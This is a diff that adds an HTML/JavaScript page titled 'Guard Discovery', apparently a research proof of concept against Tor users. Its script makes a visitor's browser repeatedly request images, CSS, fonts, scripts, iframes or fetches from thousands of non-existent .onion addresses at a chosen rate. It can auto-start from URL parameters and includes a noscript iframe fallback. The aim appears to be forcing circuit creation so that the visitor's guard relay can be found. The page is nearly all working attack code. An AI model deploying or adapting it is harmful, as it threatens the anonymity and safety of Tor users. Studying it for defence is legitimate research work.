@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <title>Guard Discovery</title>
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'; connect-src *;" />
+</head>
+
+<body>
+
+    <div id="status">
+
+        <p>Attack injecting non-existing .onion resources is: <span id="status_running"><i>not running</i></span>.</p>
+
+        <p>
+            The following parameters have been supplied:
+        <ul>
+            <li><i>autoStart:</i> <code id="status_autostart"></code></li>
+            <li><i>onionVer:</i> <code id="status_onionver"></code></li>
+            <li><i>mediaType:</i> <code id="status_mediatype"></code></li>
+            <li><i>ratePerSec:</i> <code id="status_ratepersec"></code></li>
+        </ul>
+        </p>
+
+        <p>
+            <i>Use the following GET parameters to launch attacks:
+                <code>?autoStart=(true|false)&onionVer=(2|3)&mediaType=(jpg|png|svg|css|font|js|iframe|fetch)&ratePerSec=FLOAT</code>.</i>
+        </p>
+
+        <button id="start_attack">Start attack</button>
+
+    </div>
+
+    <div id="injected">
+
+    </div>
+    <noscript>
+        <!-- this frame injects all 180 images at once -->
+        <iframe src="single_attack_frame_0.html" style="width:0;height:0;border:0; border:none;"></iframe>
+    </noscript>
+    <script>
+
+        // This index will sequentially traverse the
+        // loaded list of 5k onion addresses. This way,
+        // each request will use a new random address,
+        // but the sequence is deterministic.
+        var addrIdx = 0;
+        var addrList = [];
+
+        // This interval ID points to the object that
+        // represents the set periodic execution of the
+        // address embedding functionality.
+        var intervalID = 0;
+
+        async function loadFont(randomOnion) {
+
+            const font = new FontFace("abcdefont", "url(https://" + randomOnion + "/webfont.woff2)");
+            await font.load();
+        };
+
+        function injectCss(randomOnion) {
+
+            let embedRes = document.createElement("link");
+            embedRes.rel = "stylesheet";
+            embedRes.type = "text/css";
+            embedRes.href = "https://" + randomOnion + "/layout.css";
+            embedRes.media = "all";
+
+            document.getElementsByTagName("head")[0].appendChild(embedRes);
+        }
+
+        function injectImg(randomOnion, imgType) {
+
+            // TODO: Does the image type really matter?
+            // if not we can just go with one type and reduce complexity
+            let embedRes = document.createElement("img");
+            if (imgType == "jpg")
+                embedRes.src = "https://" + randomOnion + "/profile_picture.jpg";
+            else if (imgType == "png")
+                embedRes.src = "https://" + randomOnion + "/logo.png";
+            else
+                embedRes.src = "https://" + randomOnion + "/company.svg";
+
+            document.getElementById("injected").appendChild(embedRes);
+        }
+
+        function injectJs(randomOnion) {
+
+            let embedRes = document.createElement("script");
+            embedRes.type = "text/javascript";
+            embedRes.src = "https://" + randomOnion + "/controller.js";
+
+            document.getElementsByTagName("head")[0].appendChild(embedRes);
+        }
+
+        function injectIframe(randomOnion) {
+
+            let embedRes = document.createElement("iframe");
+            embedRes.src = "https://" + randomOnion + "/categories.html";
+            embedRes.importance = "high";
+            embedRes.loading = "eager";
+            embedRes.title = "Categories Overview Page";
+            embedRes.width = "400";
+            embedRes.height = "300";
+
+            document.getElementById("injected").appendChild(embedRes);
+        }
+
+        function makeFetchRequest(randomOnion) {
+
+            let fetchUrl = "https://" + randomOnion + "/fetch.html";
+
+            fetch(fetchUrl).then(function (response) {
+                console.log("Fetch status: ", response.status);
+            });
+        }
+
+        function injectRes(mediaType) {
+
+            // Select address at addrIdx to be the
+            // onion address to embed in this call.
+            const randomOnion = addrList[addrIdx] + ".onion";
+
+            // Increment global addrList index.
+            addrIdx += 1;
+
+            switch (mediaType) {
+                case "jpg":
+                case "png":
+                case "svg":
+                    injectImg(randomOnion, mediaType);
+                    break;
+                case "css":
+                    injectCss(randomOnion);
+                    break;
+                case "font":
+                    loadFont(randomOnion);
+                    break;
+                case "js":
+                    injectJs(randomOnion);
+                    break;
+                case "iframe":
+                    injectIframe(randomOnion);
+                    break;
+                case "fetch":
+                    makeFetchRequest(randomOnion);
+                    break;
+                default:
+                    console.error("Unrecognized media type", mediaType)
+            }
+        };
+
+        function injectResAtOnce(mediaType, ratePerSec) {
+
+            // Inject as many onion resources as specified
+            // by ratePerSec at once using above function.
+            for (let step = 0; step < ratePerSec; step++) {
+                injectRes(mediaType);
+            };
+        };
+
+        function get_by_id(elem_id) {
+            return document.getElementById(elem_id);
+        }
+
+        function set_inner_html(elem_id, text) {
+            get_by_id(elem_id).innerHTML = text;
+        }
+
+        function runAttack(onionVer, mediaType, ratePerSec) {
+
+            // Toggle button state.
+            set_inner_html("status_running", "<b>running</b>");
+            set_inner_html("start_attack", "Stop attack");
+
+            adjInterval = 1000.0;
+            adjRatePerSec = ratePerSec;
+
+            if (ratePerSec < 1.0) {
+                adjInterval = (1000.0 / ratePerSec);
+                adjRatePerSec = 1;
+            };
+
+            // Inject references to resources on non-existent onion addresses.
+            // Currently, we inject them all at once each adjInterval.
+            intervalID = setInterval(injectResAtOnce, adjInterval, mediaType, adjRatePerSec);
+
+            // However, we can also inject them appropriately stepped over the
+            // duration of one second. Swap above instruction with below one.
+            // intervalID = setInterval(injectRes, (1000.0 / ratePerSec), mediaType);
+        };
+
+        function stopAttack() {
+
+            // Toggle button state.
+            set_inner_html("status_running", "<i>not running</i>");
+            set_inner_html("start_attack", "Start attack");
+
+            // Stop injection of resources.
+            clearInterval(intervalID);
+        };
+
+        window.onload = function () {
+
+            const DEFAULT_INJECT_RATE_PER_SEC = 5.0;
+            const DEFAULT_ONION_VERSION = 2;
+            const SUPPORTED_RESOURCE_TYPES = ["jpg", "png", "svg", "css", "font", "js", "iframe", "fetch"];
+
+            const attackButton = get_by_id("start_attack");
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const autoStart = urlParams.get("autoStart") == "true" ? true : false;
+            const onionVer = parseInt(urlParams.get("onionVer"), 10) || DEFAULT_ONION_VERSION;
+            let mediaType = urlParams.get("mediaType") || "jpg";
+            const ratePerSec = parseFloat(urlParams.get("ratePerSec")) || DEFAULT_INJECT_RATE_PER_SEC;
+
+            if (!SUPPORTED_RESOURCE_TYPES.includes(mediaType)) {
+                console.log("Unrecognized resource type. Will default to jpg.");
+                mediaType = "jpg";
+            }
+
+            set_inner_html("status_autostart", "'" + autoStart + "'");
+            set_inner_html("status_onionver", "'" + onionVer + "'");
+            set_inner_html("status_mediatype", "'" + mediaType + "'");
+            set_inner_html("status_ratepersec", "'" + ratePerSec + "'");
+
+            if (autoStart) {
+                runAttack(onionVer, mediaType, ratePerSec);
+            }
+
+            attackButton.onclick = function (e) {
+
+                e.preventDefault();
+
+                if (get_by_id("start_attack").innerHTML == "Start attack") {
+                    runAttack(onionVer, mediaType, ratePerSec);
+                } else {
+                    stopAttack();
+                };
+            };
+        };
+
+    </script>
+
+</body>
+
+</html>
